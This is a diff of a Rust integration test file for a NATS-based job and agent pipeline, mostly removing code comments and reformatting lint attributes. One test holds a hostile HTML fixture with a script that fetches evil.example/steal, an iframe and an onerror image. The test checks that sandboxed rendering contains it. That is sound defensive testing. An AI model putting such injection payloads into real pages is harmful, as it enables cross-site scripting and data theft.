@@ -29,8 +29,10 @@ eval:
 "#;
 
 #[tokio::test]
-// TODO(style): oversized tier-2 test — split when this file is next touched.
-#[allow(clippy::too_many_lines)]
+#[allow(
+    clippy::too_many_lines,
+    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
+)]
 async fn submits_flow_over_nats_to_the_core() {
     let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
         return;
@@ -76,7 +78,6 @@ async fn submits_flow_over_nats_to_the_core() {
         .await
         .unwrap();
 
-    // Work agent: submit_result over NATS (env-derived subject), then commit.
     let bare = repo.bare_path();
     let submit_store = store.clone();
     provider.on_run(move |cfg| async move {
@@ -98,7 +99,6 @@ async fn submits_flow_over_nats_to_the_core() {
             .await
             .unwrap();
     });
-    // Eval agent: submit_eval over NATS using the env-injected task id.
     let eval_store = store.clone();
     provider.on_run(move |cfg| async move {
         assert_eq!(
@@ -107,7 +107,6 @@ async fn submits_flow_over_nats_to_the_core() {
         );
         let task_id = cfg.env.get("JOB_TASK_ID").unwrap();
         let subject = format!("req.eval.submit.acme.api.1.{task_id}");
-        // Malformed payload (no pass) must be rejected, not defaulted.
         let bad = eval_store
             .request_with_retry(&subject, br#"{}"#, 3, Duration::from_millis(100))
             .await
@@ -150,7 +149,6 @@ async fn submits_flow_over_nats_to_the_core() {
     handle.release_job("acme", "api", job.id).await.unwrap();
     assert_invariants_of(&sink);
 
-    // Watch job 1 until it lands Done (#206 principle 3).
     test_utils::wait::job_state(&store, "acme", "api", 1, JobState::Done).await;
     let done = store
         .jobs()
@@ -161,14 +159,11 @@ async fn submits_flow_over_nats_to_the_core() {
         .unwrap()
         .unwrap();
     assert_eq!(done.state, JobState::Done);
-    // The Done transition stamps completed_at so the jobs list can show the
-    // completion moment and derive a duration (completed_at − created_at).
     assert!(
         done.completed_at.is_some(),
         "a job reaching Done must carry completed_at"
     );
 
-    // The submit_result summary rode into the squash-merge commit body (§3.2).
     let log = repo.manager.log("acme", "api", None, 1).await.unwrap();
     assert!(
         format!("{log:?}").contains("job/1: impl-agent"),
@@ -192,8 +187,10 @@ async fn submits_flow_over_nats_to_the_core() {
 /// `onerror`, an external `<img>`/CSS `@import` fetch) survives ingest untouched
 /// and, being presentational, never leaks into the squash body.
 #[tokio::test]
-// TODO(style): oversized tier-2 test — split when this file is next touched.
-#[allow(clippy::too_many_lines)]
+#[allow(
+    clippy::too_many_lines,
+    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
+)]
 async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
     let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
         return;
@@ -247,8 +244,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
         clone.commit_file("src/f.rs", b"fn f() {}", "impl").await;
         clone.push(&branch).await;
 
-        // An oversized cover is rejected at ingest with an actionable error —
-        // never truncated, and the (canonical) summary doesn't land either.
         let huge = "x".repeat(64 * 1024 + 1);
         let payload = serde_json::json!({ "summary": "added f()", "cover_html": huge });
         let rejected = submit_store
@@ -266,10 +261,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
             "{body}"
         );
 
-        // The resubmission carries a HOSTILE cover — script, iframe, an inline
-        // event handler, and external image/CSS fetches. Ingest neither strips
-        // nor rejects it (it is within the size cap); it is stored verbatim and
-        // contained downstream by the shared sandboxed+CSP render.
         let hostile = "<script>fetch('http://evil.example/steal')</script>\
              <iframe src=\"http://evil.example/frame\"></iframe>\
              <img src=\"http://evil.example/pixel.png\" onerror=\"alert(1)\">\
@@ -326,7 +317,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
     handle.release_job("acme", "api", job.id).await.unwrap();
     assert_invariants_of(&sink);
 
-    // Watch job 1 until it lands Done (#206 principle 3).
     test_utils::wait::job_state(&store, "acme", "api", 1, JobState::Done).await;
     assert_eq!(
         store
@@ -341,7 +331,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
         JobState::Done
     );
 
-    // Stored verbatim on the Work task record (served through the task API).
     let tasks = store
         .tasks()
         .await
@@ -360,8 +349,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
             ..
         }) => {
             assert_eq!(s, "added f()");
-            // Every hostile fragment survived ingest byte-for-byte — the shared
-            // sandboxed+CSP render is what neutralizes it, not an ingest stripper.
             for marker in [
                 "<script>",
                 "<iframe",
@@ -379,10 +366,6 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
         other => panic!("expected a Work result carrying the cover, got {other:?}"),
     }
 
-    // The merge gate/squash body is unaffected: the summary rode into the commit
-    // body but no part of the (hostile) cover HTML did. The body lives below
-    // the subject line; `RepoManager::log` reads only `--format=%s`, so read
-    // the full message straight from git.
     let out = tokio::process::Command::new("git")
         .args(["log", "-1", "--format=%B", "main"])
         .current_dir(repo.bare_path())
@@ -412,8 +395,10 @@ async fn work_cover_html_round_trips_over_nats_and_absent_from_squash() {
 /// latest-value cache §6.2's `GET .../status` reads, and publishes an event
 /// that *is* the history.
 #[tokio::test]
-// TODO(style): oversized tier-2 test — split when this file is next touched.
-#[allow(clippy::too_many_lines)]
+#[allow(
+    clippy::too_many_lines,
+    reason = "TODO(style): oversized tier-2 test — split when this file is next touched."
+)]
 async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
     let Some(server) = test_utils::nats::NatsTestServer::shared().await else {
         return;
@@ -459,12 +444,8 @@ async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
         .await
         .unwrap();
 
-    // The agent narrates progress the way the channel MCP server does.
     let post_store = store.clone();
     provider.on_run(move |_cfg| async move {
-        // The channel binary stamps its task origin (§6.3); the first post
-        // carries it flattened onto the wire, the second omits it (legacy shape)
-        // — both must survive as events.
         for body in [
             br#"{"message":"cloning","percent":10,"task_id":1,"phase":"Work"}"#.as_slice(),
             br#"{"message":"running tests","percent":60}"#.as_slice(),
@@ -513,9 +494,6 @@ async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
         .await
         .unwrap();
     assert_invariants_of(&sink);
-    // Subscribe to the event stream BEFORE releasing so no post is missed —
-    // a message wait uses a consumer created before the triggering action
-    // (#206 principle 3), then drains it under a hard timeout.
     let mut events_sub = store
         .subscribe_stream(
             "job-events",
@@ -527,7 +505,6 @@ async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
     handle.release_job("acme", "api", job.id).await.unwrap();
     assert_invariants_of(&sink);
 
-    // Both updates and the reply survive as events — the whole point.
     let mut updates: Vec<serde_json::Value> = Vec::new();
     let mut replies: Vec<serde_json::Value> = Vec::new();
     let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(30);
@@ -548,16 +525,13 @@ async fn channel_posts_accumulate_as_history_instead_of_overwriting() {
     assert_eq!(updates.len(), 2, "both updates must survive: {updates:?}");
     assert_eq!(updates[0]["message"], "cloning");
     assert_eq!(updates[0]["percent"], 10);
-    // §6.3: the stamped task origin rides through to the event…
     assert_eq!(updates[0]["task_id"], 1);
     assert_eq!(updates[0]["phase"], "Work");
     assert_eq!(updates[1]["message"], "running tests");
-    // …and a legacy post without it still lists, carrying no origin keys.
     assert!(updates[1].get("task_id").is_none());
     assert_eq!(replies.len(), 1, "reply recorded: {replies:?}");
     assert_eq!(replies[0]["text"], "on it");
 
-    // The KV entry still holds the latest of each, for GET .../status.
     let entry: serde_json::Value = store
         .raw_bucket(store::buckets::CHANNELS)
         .await
